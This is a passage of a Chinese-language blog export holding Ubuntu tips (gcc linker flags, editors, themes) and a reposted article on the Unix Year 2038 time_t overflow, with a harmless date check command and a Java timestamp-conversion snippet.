title=\"gcc编译器问题\"></a>gcc编译器问题</h2><p><strong>最近我自己写了一些代码，有自己定义的头文件，在ubuntu中用gcc编译器编译时总是出现许多对‘XXX’未定义的引用，我疑惑了很久，后来意外的解决了，一个原因是要编译多个源文件的程序时，所有的源文件都要放在一起编译，还有就是用math.h头文件时要在命令最后加上-lm,还有用ncurses.h头文件时也要用-lcurses,什么原因要是要google搜搜，最后吐槽一下自己，发现自己已经在c这门语言的路上越走越远，我并不想这样，感觉写什么程序都要被迫用c，我想学用python,java。然而到目前为止，我仍然对他们很陌生，好苦逼</strong></p>\n<h2 id=\"atom编辑器\"><a href=\"#atom编辑器\" class=\"headerlink\" title=\"atom编辑器\"></a>atom编辑器</h2><p><strong><a href=\"http://www.jianshu.com/p/b4c8479cfaa5\">atom</a>是一个类似sublime text的编译器，但是个人观点atom好看到无解，好用好看，是真的好。这是我强烈推荐的一款软件，不用真的会后悔，这还是寝室大神告诉我的，我偶然看见他在用，就问是什么编译器。我推荐给另一个人的时候，他居然居然说什么编译器都一样，只要能用就行。我愣了！他还在用Dev，有visual studio这样强大的东西，又有atom那么好看的东西，他居然还在用Dev。反正我是无法理解。</strong></p>\n<h2 id=\"主题推荐\"><a href=\"#主题推荐\" class=\"headerlink\" title=\"主题推荐\"></a>主题推荐</h2><p><strong>ubuntu上主题好看的不少，个人钟情与flatabulous，这个主题满足了我的个人审美，具体操作看这篇博文： <a href=\"http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html\">http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html</a></strong></p>\n<h2 id=\"ubuntu配置QQ\"><a href=\"#ubuntu配置QQ\" class=\"headerlink\" title=\"ubuntu配置QQ\"></a>ubuntu配置QQ</h2><p><strong>之前试过好多次没成功，意外之间找到了一个网站便用上了，能满足一般的QQ要求，跟windows的QQ很像，网站如下： <a href=\"http://ttop5.net/?p=1316\">http://ttop5.net/?p=1316</a></strong></p>\n<h2 id=\"ubuntu写markdown工具\"><a href=\"#ubuntu写markdown工具\" class=\"headerlink\" title=\"ubuntu写markdown工具\"></a>ubuntu写markdown工具</h2><p><strong>推荐haroopad，很好用，可以实时显示效果,推荐博文： <a href=\"http://www.jianshu.com/p/064aec7a5164\">http://www.jianshu.com/p/064aec7a5164</a></strong></p>"},{"title":"Unix 时间问题(非原创)","date":"2017-11-21T07:18:23.000Z","_content":"\n## 故事缘由\n**有时候不得不相信，有些东西就是刚刚好，刚刚好到来，刚刚好知道，刚刚好契合。因为这些刚刚好，就会不由自主的激动，感觉这些刚知道的东西发生在自己身上。这次要说的是unix时间问题，我最开始接触这个问题是我们云计算课程项目中一个小小的时间问题，当时项目中所有的时间都是通过unix时间记录。所谓unix时间，就是记录从unix元年1970年1月1日0点起到当前时间经过的秒数。这个问题最开始我并没有觉得有什么问题，但后来我在网上瞎逛的时候看见了一篇文章 [十大著名的计算机发展史上的软件缺陷](http://www.wttech.org/archives/3960) ,这里就讲到了一个unix时间问题，我就很好奇的去了解这一个故事，而在这个时间点，我们正在进行的操作系统课程也讲到了unix时间，所以这一堆堆事情，就刚刚好地发生了。 **\n<!--more-->\n\n## 2038问题\n**2038年问题的成因与20世纪90年代曾经名噪一时的千年虫问题很类似。千年虫问题是因为早期(早在20世纪50年前以前)程序员们使用两位十进制数字来表示年份(为了节约存储空间和书写程序的便利)，并且在很长一段时间内，没有意识到这么做可能给后人带来的麻烦;当所有人都习惯这么做时，随着软件系统变得越来越复杂，小问题就逐渐变成大问题了。**\n\n**说起Unix上的2038年问题，时间要追溯到1969年。当Ken Thompson和Dennis Ritchie在贝尔实验室里捣鼓他们的新玩意时，他们肯定没有想到他们的小发明将来会在全世界发挥如此大的影响力。他们决定把他们所创造的这个支持多用户多任务的新操作系统命名为UNIX，以一个32位二进制数所能表示的有符号整数范围（-2,147,483,648 ~ +2,147,483,647）所代表的秒数作为Unix纪元（Unix epoch）时间，把西元1970年1月1日0时0分0秒定为Unix纪元的元年。**\n\n**在Unix历的约第100,000,000秒（或者，用人类的纪年法，大约在西元1972~1973年之间），一种叫做C的高级程序语言被发明出来了。于是，贝尔实验室的这帮人用C语言重写了他们的UNIX系统内核，很自然地，系统库中用于存储时间的time_t类型的typedef定义，就采用了C语言中对应的32位有符号整型（signed int32）来实现。**\n\n**起初，一切都很好。UNIX走出了贝尔实验室中少数研究人员的小圈子，得到了工业界的青睐，好几家商业公司都发行了自己的Unix变体，其中包括最早的商业版UNIX System V以及后来的IBM AIX、HP-UX、SGI的IRIX和微软的Xenix，它们被广泛用在各式大中小型主机和服务器上。到了80年代初，当时在麻省理工大学人工智能实验室工作的一个大胡子黑客不满于Unix这种专有软件的闭源开发模式，他决定重写一个完全自由的仿Unix操作系统，但又不是Unix，这就是后来的GNU (GNU is Not Unix) Project；与此同时，在西海岸，UC Berkeley的另一群黑客获得了一部分来自最初贝尔实验室的Unix原始代码，他们在此基础上开发出属于自己的一套“伯克利软件发行包（Berkeley Software Distribution）”，这演变成了后来的BSD家族。很快，时间已经到了Unix纪元的第31年，在大洋彼岸的北欧国家芬兰，一个年轻大学生自己写了一个仿Unix内核，受到当时GNU发起的自由软件运动的影响，他决定把这个内核以GPL协议发放出来，让全世界的黑客们来共同使用、参与开发。恰好那时GNU操作系统还没有自己的成熟内核，这个后来被命名为“Linux”的仿Unix内核借着与GNU Project的结合获得了广泛的成功与关注。最终，就有了我们今天所使用的GNU/Linux。在很长一段时间里，不管是真正的Unix和由它直接衍生而来的BSD、Solaris，还是试图“仿造出”Unix的GNU/Linux，抑或是为了统一各种类Unix（*nix）系统而生的POSIX标准，所有的类Unix系统都把time_t类型理所当然地等价为C语言中的原生数据类型signed int32，无数的库和工具被基于它写出来，很多网络上的服务与应用也是基于这个事实的标准。**\n\n**终于有一天，人们意识到，32 bits整数所能表示的数目大小毕竟是有限的，更何况这个数字是以秒作为单位。对于正在各行各业发挥着越来越重要作用的类Unix系统来说，当初的设定显然也太目光短浅了些。**\n\n**32位有符号整型所能表示的最大数是+2,147,483,647。2147483647秒 = 24855天 = 68年。也就是说，自Unix纪元的元年（1970年）起，再过68年，所有现存的32位类Unix系统都将迎来历法上的终结——对+2,147,483,647加1将造成一个算术溢出：在大部分系统上，返回值会变成-2,147,483,648，在少数系统上，返回值可能是0。许多依赖于系统时间的程序将无法正常工作，计算机的时钟也将退回到1901年（或者1970年）。它们将无法正确处理那之后的时间。**\n\n**这个准确的时刻是：协调世界时2038年1月19日3时14分7秒（未考虑闰秒）。你可以在维基百科上找到更多的信息。**\n\n## 更多的“xx”年问题\n**一个与Unix的2038年问题相类似的是NTP协议的2036年问题。NTP协议的时间戳采用了和Unix相似的32位整数表示，不同于Unix的1970 ± 68年范围，NTP使用的是无符号整型，并且以1900作为时间的起点，这意味着它的终点将是1900 + 136 = 2036年2月6日。**\n\n**和2038年问题直接相关的两个历史事件是2001年9月9日问题和2004年日本银行ATM机故障：**\n**2001年9月9日问题又被称作S1G（Second 1 Giga，一吉秒）或者S1B（Second 1 Billion）问题。在那一天，Unix纪元时间迎来了第1,000,000,000秒，由于某些软件中使用了字符串来存储时间戳，当字符串变成\"1000000000\"时，字典排序的结果会产生\"999999999\" ＞ \"1000000000\"，这造成了相当一部分程序不能正常判断时间差，影响到正常工作。（我一直以为只有不上路子的2B程序员才会这么去做判断，没想到还真不少，包括KDE在内。。。）**\n\n**2004年1月10日恰好是1970年到2038年时间轴上的中点——显然，如果你在程序中出于某种目的将Unix时间乘以了2，那么它将不能正常工作。这在日本某些银行使用了IBM软件的ATM机上确实发生了。（至于究竟为什么要把时间乘以2，我只能表示不明觉厉。）**\n\n**可以肯定地说，全世界的程序员都是一群爱偷懒的货。**\n\n## 轻松一刻\n**在2001年S1B问题发生之前的4月19日，恰好迎来了Unix纪元的第987,654,321秒。虽然没什么实质意义（估计没有哪个程序会无聊到去计算时间戳中不同数字的个数），但这还是在Slashdot上激起了不少讨论。**\n\n**2009年2月13日11:31:30，是Unix纪元的第1,234,567,890秒。这天刚好是星期五，又是一个13号，也就是西方文化中所谓的黑色星期五。世界各地不少Unix社区都在举办活动庆祝此事，包括Google的hackers们。他们甚至还做了一个Doodle：**\n![](https://www.google.com/logos/unix1234567890.gif)\n\n## 从32位到64位\n**解决2038年问题的办法看似很简单：因为time_t类型本来就是依赖于C POSIX库的具体实现的，并没有哪个规范规定它必须是32位，直接把它改成64位不就行了吗？**\n\n**问题是，直接这么改，会破坏很多现有程序（工具、服务……）的兼容性。几乎所有的32位系统都自然而然地采用了32位的time_t，这其中包括了现在绝大多数基于ARM处理器的电子产品（只要它们的底层系统是基于类Unix的——这包括iPad、iPhone、所有Android手机、PS Vita还有Raspberry Pi等等）**\n\n**当然你大可不必担心你的手机会遭遇2038年问题，因为你现在的手机大概不会一直用到2038年（也许再过几个月你就会淘汰掉旧的去换新的了！）。剩下来的，就是桌面和服务器所要面临的问题了。**\n\n**所幸的是，摆脱了嵌入式设备的局限性，我们在桌面和服务器上已经有了众多的64位体系架构可供选择。而且，目前绝大多数的64位操作系统，也都自然而然地采用了64位time_t类型（相当于long long int或者int64）。**\n\n**问题解决了。只要我们可以预期现有的计算机都能在2038年之前迁移到64位系统（准确地说，是采用了64位time_t的系统），Unix纪元就不会迎来末日。到了那一天，所有的计算机系统仍然能正常工作，人类文明完好如初。**\n\n**传统的32位Unix纪元时间会在2038年发生算术溢出，然后迎接末日。64位纪元当然也是会有这一天的，那将是在**\n\n`15:30:08 UTC on Sun, 4 December 292,277,026,596`\n\n**这个时间已经远远超过了预计太阳扩张成红巨星并吞噬地球的时间。所以，在此之前，已经没有什么好担心的了。我确信，要么人类文明要么根本都熬不到那一天，要么等到那一天，我们早就达到了拥有任意操纵时间和空间的能力的技术奇点，人类文明将获得永生（跑题了。。。）；要么就是，所有的电脑都已经迁移到了128位。（这当然是最简单的解决办法）**\n\n## 你的系统如何？\n**想知道自己的Unix系统是否会在2038年1月19日这一天迎来末日，只要看系统能否正确显示Unix纪元第2,147,483,648秒的日期即可。**\n\n**在GNU/Linux上，执行：(GNU date)**\n``` bash\n$ date -ud @2147483648\n```\n\n**如果系统使用了64位时间，结果应该是正常的：（后文中假定时区一律设为export TZ=\"UTC\"）**\n``` bash\n2038年 01月 19日 星期二 03:14:08 UTC\n```\n\n**那么恭喜，你的系统可以平安无恙地度过2038年末日。如果出现1901年或者其他神马奇怪结果的话，自己看着办吧。**\n\n**另：Unix是否会发生2038年问题并不绝对取决于是32位系统还是64位系统。这由具体系统中对time_t类型的实现决定。NetBSD和OpenBSD的早期版本在amd64平台上仍然使用了32位time_t，因此仍然会发生2038年问题。如今也有一些32位系统开始使用64位的time_t类型（典型的例子：今年10月份发布的NetBSD 6.0，在32位和64位平台上一律改成了64位time_t）。64位Linux上已经在使用64位的time_t了，而32位Linux上则似乎仍然是32位。**\n\n## 那么我遇到了什么问题\n**在编写云计算项目程序的时候，我将unix时间转换为`java`的`Date`类型，但是我忘了java的时间默认是以`ms`为单位，所有我转换unix时间的时候原本单位是`s`，结果`java`把它当作`ms`，这样的结果就是原本时间应该是2016年6月1日的时间，变成了1970年1月的某一天。因此，在转换的时候要记得在unix时间上乘以1000**\n\n``` java\n@Test\n\tpublic void contextLoads() {\n\t\tSimpleDateFormat format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\t\tLong time = Long.parseLong(\"1496246559\")*1000;\n\t\tString d = format.format(time);\n\t\ttry {\n\t\t\tDate date = format.parse(d);\n\t\t\tSystem.out.println(date);\n\t\t} catch (ParseException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n```\n\n## 参考资料/相关链接\n- 关于2038年问题\n\t* [http://en.wikipedia.org/wiki/Year_2038_problem](http://en.wikipedia.org/wiki/Year_2038_problem)\n\t* [http://www.y2038.com/](http://www.y2038.com/)\n- 关于计算机纪元法和Unix时间\n\t* [https://en.wikipedia.org/wiki/Epoch_(reference_date)#Computing]()\n\t* [http://en.wikipedia.org/wiki/Unix_time](http://en.wikipedia.org/wiki/Unix_time)\n- 原创链接\n\t* [http://ju.outofmemory.cn/entry/95734](http://ju.outofmemory.cn/entry/95734)","source":"_posts/unix时间md.md","raw":"---\ntitle: Unix 时间问题(非原创)\ntags: unix时间\ndate: 2017-11-21 15:18:23\ncategories: linux\n---\n\n## 故事缘由\n**有时候不得不相信，有些东西就是刚刚好，刚刚好到来，刚刚好知道，刚刚好契合。因为这些刚刚好，就会不由自主的激动，感觉这些刚知道的东西发生在自己身上。这次要说的是unix时间问题，我最开始接触这个问题是我们云计算课程项目中一个小小的时间问题，当时项目中所有的时间都是通过unix时间记录。所谓unix时间，就是记录从unix元年1970年1月1日0点起到当前时间经过的秒数。这个问题最开始我并没有觉得有什么问题，但后来我在网上瞎逛的时候看见了一篇文章 [十大著名的计算机发展史上的软件缺陷](http://www.wttech.org/archives/3960) ,这里就讲到了一个unix时间问题，我就很好奇的去了解这一个故事，而在这个时间点，我们正在进行的操作系统课程也讲到了unix时间，所以这一堆堆事情，就刚刚好地发生了。 **\n<!--more-->\n\n## 2038问题\n**2038年问题的成因与20世纪90年代曾经名噪一时的千年虫问题很类似。千年虫问题是因为早期(早在20世纪50年前以前)程序员们使用两位十进制数字来表示年份(为了节约存储空间和书写程序的便利)，并且在很长一段时间内，没有意识到这么做可能给后人带来的麻烦;当所有人都习惯这么做时，随着软件系统变得越来越复杂，小问题就逐渐变成大问题了。**\n\n**说起Unix上的2038年问题，时间要追溯到1969年。当Ken Thompson和Dennis Ritchie在贝尔实验室里捣鼓他们的新玩意时，他们肯定没有想到他们的小发明将来会在全世界发挥如此大的影响力。他们决定把他们所创造的这个支持多用户多任务的新操作系统命名为UNIX，以一个32位二进制数所能表示的有符号整数范围（-2,147,483,648 ~ +2,147,483,647）所代表的秒数作为Unix纪元（Unix epoch）时间，把西元1970年1月1日0时0分0秒定为Unix纪元的元年。**\n\n**在Unix历的约第100,000,000秒（或者，用人类的纪年法，大约在西元1972~1973年之间），一种叫做C的高级程序语言被发明出来了。于是，贝尔实验室的这帮人用C语言重写了他们的UNIX系统内核，很自然地，系统库中用于存储时间的time_t类型的typedef定义，就采用了C语言中对应的32位有符号整型（signed int32）来实现。**\n\n**起初，一切都很好。UNIX走出了贝尔实验室中少数研究人员的小圈子，得到了工业界的青睐，好几家商业公司都发行了自己的Unix变体，其中包括最早的商业版UNIX System V以及后来的IBM AIX、HP-UX、SGI的IRIX和微软的Xenix，它们被广泛用在各式大中小型主机和服务器上。到了80年代初，当时在麻省理工大学人工智能实验室工作的一个大胡子黑客不满于Unix这种专有软件的闭源开发模式，他决定重写一个完全自由的仿Unix操作系统，但又不是Unix，这就是后来的GNU (GNU is Not Unix) Project；与此同时，在西海岸，UC Berkeley的另一群黑客获得了一部分来自最初贝尔实验室的Unix原始代码，他们在此基础上开发出属于自己的一套“伯克利软件发行包（Berkeley Software Distribution）”，这演变成了后来的BSD家族。很快，时间已经到了Unix纪元的第31年，在大洋彼岸的北欧国家芬兰，一个年轻大学生自己写了一个仿Unix内核，受到当时GNU发起的自由软件运动的影响，他决定把这个内核以GPL协议发放出来，让全世界的黑客们来共同使用、参与开发。恰好那时GNU操作系统还没有自己的成熟内核，这个后来被命名为“Linux”的仿Unix内核借着与GNU Project的结合获得了广泛的成功与关注。最终，就有了我们今天所使用的GNU/Linux。在很长一段时间里，不管是真正的Unix和由它直接衍生而来的BSD、Solaris，还是试图“仿造出”Unix的GNU/Linux，抑或是为了统一各种类Unix（*nix）系统而生的POSIX标准，所有的类Unix系统都把time_t类型理所当然地等价为C语言中的原生数据类型signed int32，无数的库和工具被基于它写出来，很多网络上的服务与应用也是基于这个事实的标准。**\n\n**终于有一天，人们意识到，32 bits整数所能表示的数目大小毕竟是有限的，更何况这个数字是以秒作为单位。对于正在各行各业发挥着越来越重要作用的类Unix系统来说，当初的设定显然也太目光短浅了些。**\n\n**32位有符号整型所能表示的最大数是+2,147,483,647。2147483647秒 = 24855天 = 68年。也就是说，自Unix纪元的元年（1970年）起，再过68年，所有现存的32位类Unix系统都将迎来历法上的终结——对+2,147,483,647加1将造成一个算术溢出：在大部分系统上，返回值会变成-2,147,483,648，在少数系统上，返回值可能是0。许多依赖于系统时间的程序将无法正常工作，计算机的时钟也将退回到1901年（或者1970年）。它们将无法正确处理那之后的时间。**\n\n**这个准确的时刻是：协调世界时2038年1月19日3时14分7秒（未考虑闰秒）。你可以在维基百科上找到更多的信息。**\n\n## 更多的“xx”年问题\n**一个与Unix的2038年问题相类似的是NTP协议的2036年问题。NTP协议的时间戳采用了和Unix相似的32位整数表示，不同于Unix的1970 ± 68年范围，NTP使用的是无符号整型，并且以1900作为时间的起点，这意味着它的终点将是1900 + 136 = 2036年2月6日。**\n\n**和2038年问题直接相关的两个历史事件是2001年9月9日问题和2004年日本银行ATM机故障：**\n**2001年9月9日问题又被称作S1G（Second 1 Giga，一吉秒）或者S1B（Second 1 Billion）问题。在那一天，Unix纪元时间迎来了第1,000,000,000秒，由于某些软件中使用了字符串来存储时间戳，当字符串变成\"1000000000\"时，字典排序的结果会产生\"999999999\" ＞ \"1000000000\"，这造成了相当一部分程序不能正常判断时间差，影响到正常工作。（我一直以为只有不上路子的2B程序员才会这么去做判断，没想到还真不少，包括KDE在内。。。）**\n\n**2004年1月10日恰好是1970年到2038年时间轴上的中点——显然，如果你在程序中出于某种目的将Unix时间乘以了2，那么它将不能正常工作。这在日本某些银行使用了IBM软件的ATM机上确实发生了。（至于究竟为什么要把时间乘以2，我只能表示不明觉厉。）**\n\n**可以肯定地说，全世界的程序员都是一群爱偷懒的货。**\n\n## 轻松一刻\n**在2001年S1B问题发生之前的4月19日，恰好迎来了Unix纪元的第987,654,321秒。虽然没什么实质意义（估计没有哪个程序会无聊到去计算时间戳中不同数字的个数），但这还是在Slashdot上激起了不少讨论。**\n\n**2009年2月13日11:31:30，是Unix纪元的第1,234,567,890秒。这天刚好是星期五，又是一个13号，也就是西方文化中所谓的黑色星期五。世界各地不少Unix社区都在举办活动庆祝此事，包括Google的hackers们。他们甚至还做了一个Doodle：**\n![](https://www.google.com/logos/unix1234567890.gif)\n\n## 从32位到64位\n**解决2038年问题的办法看似很简单：因为time_t类型本来就是依赖于C POSIX库的具体实现的，并没有哪个规范规定它必须是32位，直接把它改成64位不就行了吗？**\n\n**问题是，直接这么改，会破坏很多现有程序（工具、服务……）的兼容性。几乎所有的32位系统都自然而然地采用了32位的time_t，这其中包括了现在绝大多数基于ARM处理器的电子产品（只要它们的底层系统是基于类Unix的——这包括iPad、iPhone、所有Android手机、PS Vita还有Raspberry Pi等等）**\n\n**当然你大可不必担心你的手机会遭遇2038年问题，因为你现在的手机大概不会一直用到2038年（也许再过几个月你就会淘汰掉旧的去换新的了！）。剩下来的，就是桌面和服务器所要面临的问题了。**\n\n**所幸的是，摆脱了嵌入式设备的局限性，我们在桌面和服务器上已经有了众多的64位体系架构可供选择。而且，目前绝大多数的64位操作系统，也都自然而然地采用了64位time_t类型（相当于long long int或者int64）。**\n\n**问题解决了。只要我们可以预期现有的计算机都能在2038年之前迁移到64位系统（准确地说，是采用了64位time_t的系统），Unix纪元就不会迎来末日。到了那一天，所有的计算机系统仍然能正常工作，人类文明完好如初。**\n\n**传统的32位Unix纪元时间会在2038年发生算术溢出，然后迎接末日。64位纪元当然也是会有这一天的，那将是在**\n\n`15:30:08 UTC on Sun, 4 December 292,277,026,596`\n\n**这个时间已经远远超过了预计太阳扩张成红巨星并吞噬地球的时间。所以，在此之前，已经没有什么好担心的了。我确信，要么人类文明要么根本都熬不到那一天，要么等到那一天，我们早就达到了拥有任意操纵时间和空间的能力的技术奇点，人类文明将获得永生（跑题了。。。）；要么就是，所有的电脑都已经迁移到了128位。（这当然是最简单的解决办法）**\n\n## 你的系统如何？\n**想知道自己的Unix系统是否会在2038年1月19日这一天迎来末日，只要看系统能否正确显示Unix纪元第2,147,483,648秒的日期即可。**\n\n**在GNU/Linux上，执行：(GNU date)**\n``` bash\n$ date -ud @2147483648\n```\n\n**如果系统使用了64位时间，结果应该是正常的：（后文中假定时区一律设为export TZ=\"UTC\"）**\n``` bash\n2038年 01月 19日 星期二 03:14:08 UTC\n```\n\n**那么恭喜，你的系统可以平安无恙地度过2038年末日。如果出现1901年或者其他神马奇怪结果的话，自己看着办吧。**\n\n**另：Unix是否会发生2038年问题并不绝对取决于是32位系统还是64位系统。这由具体系统中对time_t类型的实现决定。NetBSD和OpenBSD的早期版本在amd64平台上仍然使用了32位time_t，因此仍然会发生2038年问题。如今也有一些32位系统开始使用64位的time_t类型（典型的例子：今年10月份发布的NetBSD 6.0，在32位和64位平台上一律改成了64位time_t）。64位Linux上已经在使用64位的time_t了，而32位Linux上则似乎仍然是32位。**\n\n## 那么我遇到了什么问题\n**在编写云计算项目程序的时候，我将unix时间转换为`java`的`Date`类型，但是我忘了java的时间默认是以`ms`为单位，所有我转换unix时间的时候原本单位是`s`，结果`java`把它当作`ms`，这样的结果就是原本时间应该是2016年6月1日的时间，变成了1970年1月的某一天。因此，在转换的时候要记得在unix时间上乘以1000**\n\n``` java\n@Test\n\tpublic void contextLoads() {\n\t\tSimpleDateFormat format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\t\tLong time = Long.parseLong(\"1496246559\")*1000;\n\t\tString d = format.format(time);\n\t\ttry {\n\t\t\tDate date = format.parse(d);\n\t\t\tSystem.out.println(date);\n\t\t} catch (ParseException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n```\n\n## 参考资料/相关链接\n- 关于2038年问题\n\t* [http://en.wikipedia.org/wiki/Year_2038_problem](http://en.wikipedia.org/wiki/Year_2038_problem)\n\t* [http://www.y2038.com/](http://www.y2038.com/)\n- 关于计算机纪元法和Unix时间\n\t* [https://en.wikipedia.org/wiki/Epoch_(reference_date)#Computing]()\n\t* [http://en.wikipedia.org/wiki/Unix_time](http://en.wikipedia.org/wiki/Unix_time)\n- 原创链接\n\t* [http://ju.outofmemory.cn/entry/95734](http://ju.outofmemory.cn/entry/95734)","slug":"unix时间md","published":1,"updated":"2017-11-28T03:10:28.765Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczv0030yp0l5pye5wka","content":"<h2 id=\"故事缘由\"><a href=\"#故事缘由\" class=\"headerlink\" title=\"故事缘由\"></a>故事缘由</h2><p><strong>有时候不得不相信，有些东西就是刚刚好，刚刚好到来，刚刚好知道，刚刚好契合。因为这些刚刚好，就会不由自主的激动，感觉这些刚知道的东西发生在自己身上。这次要说的是unix时间问题，我最开始接触这个问题是我们云计算课程项目中一个小小的时间问题，当时项目中所有的时间都是通过unix时间记录。所谓unix时间，就是记录从unix元年1970年1月1日0点起到当前时间经过的秒数。这个问题最开始我并没有觉得有什么问题，但后来我在网上瞎逛的时候看见了一篇文章 <a href=\"http://www.wttech.org/archives/3960\" target=\"_blank\" rel=\"external\">十大著名的计算机发展史上的软件缺陷</a> ,这里就讲到了一个unix时间问题，我就很好奇的去了解这一个故事，而在这个时间点，我们正在进行的操作系统课程也讲到了unix时间，所以这一堆堆事情，就刚刚好地发生了。 </strong><br><a id=\"more\"></a></p>\n<h2 id=\"2038问题\"><a href=\"#2038问题\" class=\"headerlink\" title=\"2038问题\"></a>2038问题</h2><p><strong>2038年问题的成因与20世纪90年代曾经名噪一时的千年虫问题很类似。千年虫问题是因为早期(早在20世纪50年前以前)程序员们使用两位十进制数字来表示年份(为了节约存储空间和书写程序的便利)，并且在很长一段时间内，没有意识到这么做可能给后人带来的麻烦;当所有人都习惯这么做时，随着软件系统变得越来越复杂，小问题就逐渐变成大问题了。</strong></p>\n<p><strong>说起Unix上的2038年问题，时间要追溯到1969年。当Ken Thompson和Dennis Ritchie在贝尔实验室里捣鼓他们的新玩意时，他们肯定没有想到他们的小发明将来会在全世界发挥如此大的影响力。他们决定把他们所创造的这个支持多用户多任务的新操作系统命名为UNIX，以一个32位二进制数所能表示的有符号整数范围（-2,147,483,648 ~ +2,147,483,647）所代表的秒数作为Unix纪元（Unix epoch）时间，把西元1970年1月1日0时0分0秒定为Unix纪元的元年。</strong></p>\n<p><strong>在Unix历的约第100,000,000秒（或者，用人类的纪年法，大约在西元1972~1973年之间），一种叫做C的高级程序语言被发明出来了。于是，贝尔实验室的这帮人用C语言重写了他们的UNIX系统内核，很自然地，系统库中用于存储时间的time_t类型的typedef定义，就采用了C语言中对应的32位有符号整型（signed int32）来实现。</strong></p>\n<p><strong>起初，一切都很好。UNIX走出了贝尔实验室中少数研究人员的小圈子，得到了工业界的青睐，好几家商业公司都发行了自己的Unix变体，其中包括最早的商业版UNIX System V以及后来的IBM AIX、HP-UX、SGI的IRIX和微软的Xenix，它们被广泛用在各式大中小型主机和服务器上。到了80年代初，当时在麻省理工大学人工智能实验室工作的一个大胡子黑客不满于Unix这种专有软件的闭源开发模式，他决定重写一个完全自由的仿Unix操作系统，但又不是Unix，这就是后来的GNU (GNU is Not Unix) Project；与此同时，在西海岸，UC Berkeley的另一群黑客获得了一部分来自最初贝尔实验室的Unix原始代码，他们在此基础上开发出属于自己的一套“伯克利软件发行包（Berkeley Software Distribution）”，这演变成了后来的BSD家族。很快，时间已经到了Unix纪元的第31年，在大洋彼岸的北欧国家芬兰，一个年轻大学生自己写了一个仿Unix内核，受到当时GNU发起的自由软件运动的影响，他决定把这个内核以GPL协议发放出来，让全世界的黑客们来共同使用、参与开发。恰好那时GNU操作系统还没有自己的成熟内核，这个后来被命名为“Linux”的仿Unix内核借着与GNU Project的结合获得了广泛的成功与关注。最终，就有了我们今天所使用的GNU/Linux。在很长一段时间里，不管是真正的Unix和由它直接衍生而来的BSD、Solaris，还是试图“仿造出”Unix的GNU/Linux，抑或是为了统一各种类Unix（*nix）系统而生的POSIX标准，所有的类Unix系统都把time_t类型理所当然地等价为C语言中的原生数据类型signed int32，无数的库和工具被基于它写出来，很多网络上的服务与应用也是基于这个事实的标准。</strong></p>\n<p><strong>终于有一天，人们意识到，32 bits整数所能表示的数目大小毕竟是有限的，更何况这个数字是以秒作为单位。对于正在各行各业发挥着越来越重要作用的类Unix系统来说，当初的设定显然也太目光短浅了些。</strong></p>\n<p><strong>32位有符号整型所能表示的最大数是+2,147,483,647。2147483647秒 = 24855天 = 68年。也就是说，自Unix纪元的元年（1970年）起，再过68年，所有现存的32位类Unix系统都将迎来历法上的终结——对+2,147,483,647加1将造成一个算术溢出：在大部分系统上，返回值会变成-2,147,483,648，在少数系统上，返回值可能是0。许多依赖于系统时间的程序将无法正常工作，计算机的时钟也将退回到1901年（或者1970年）。它们将无法正确处理那之后的时间。</strong></p>\n<p><strong>这个准确的时刻是：协调世界时2038年1月19日3时14分7秒（未考虑闰秒）。你可以在维基百科上找到更多的信息。</strong></p>\n<h2 id=\"更多的“xx”年问题\"><a href=\"#更多的“xx”年问题\" class=\"headerlink\" title=\"更多的“xx”年问题\"></a>更多的“xx”年问题</h2><p><strong>一个与Unix的2038年问题相类似的是NTP协议的2036年问题。NTP协议的时间戳采用了和Unix相似的32位整数表示，不同于Unix的1970 ± 68年范围，NTP使用的是无符号整型，并且以1900作为时间的起点，这意味着它的终点将是1900 + 136 = 2036年2月6日。</strong></p>\n<p><strong>和2038年问题直接相关的两个历史事件是2001年9月9日问题和2004年日本银行ATM机故障：</strong><br><strong>2001年9月9日问题又被称作S1G（Second 1 Giga，一吉秒）或者S1B（Second 1 Billion）问题。在那一天，Unix纪元时间迎来了第1,000,000,000秒，由于某些软件中使用了字符串来存储时间戳，当字符串变成”1000000000”时，字典排序的结果会产生”999999999” ＞ “1000000000”，这造成了相当一部分程序不能正常判断时间差，影响到正常工作。（我一直以为只有不上路子的2B程序员才会这么去做判断，没想到还真不少，包括KDE在内。。。）</strong></p>\n<p><strong>2004年1月10日恰好是1970年到2038年时间轴上的中点——显然，如果你在程序中出于某种目的将Unix时间乘以了2，那么它将不能正常工作。这在日本某些银行使用了IBM软件的ATM机上确实发生了。（至于究竟为什么要把时间乘以2，我只能表示不明觉厉。）</strong></p>\n<p><strong>可以肯定地说，全世界的程序员都是一群爱偷懒的货。</strong></p>\n<h2 id=\"轻松一刻\"><a href=\"#轻松一刻\" class=\"headerlink\" title=\"轻松一刻\"></a>轻松一刻</h2><p><strong>在2001年S1B问题发生之前的4月19日，恰好迎来了Unix纪元的第987,654,321秒。虽然没什么实质意义（估计没有哪个程序会无聊到去计算时间戳中不同数字的个数），但这还是在Slashdot上激起了不少讨论。</strong></p>\n<p><strong>2009年2月13日11:31:30，是Unix纪元的第1,234,567,890秒。这天刚好是星期五，又是一个13号，也就是西方文化中所谓的黑色星期五。世界各地不少Unix社区都在举办活动庆祝此事，包括Google的hackers们。他们甚至还做了一个Doodle：</strong><br><img src=\"https://www.google.com/logos/unix1234567890.gif\" alt=\"\"></p>\n<h2 id=\"从32位到64位\"><a href=\"#从32位到64位\" class=\"headerlink\" title=\"从32位到64位\"></a>从32位到64位</h2><p><strong>解决2038年问题的办法看似很简单：因为time_t类型本来就是依赖于C POSIX库的具体实现的，并没有哪个规范规定它必须是32位，直接把它改成64位不就行了吗？</strong></p>\n<p><strong>问题是，直接这么改，会破坏很多现有程序（工具、服务……）的兼容性。几乎所有的32位系统都自然而然地采用了32位的time_t，这其中包括了现在绝大多数基于ARM处理器的电子产品（只要它们的底层系统是基于类Unix的——这包括iPad、iPhone、所有Android手机、PS Vita还有Raspberry 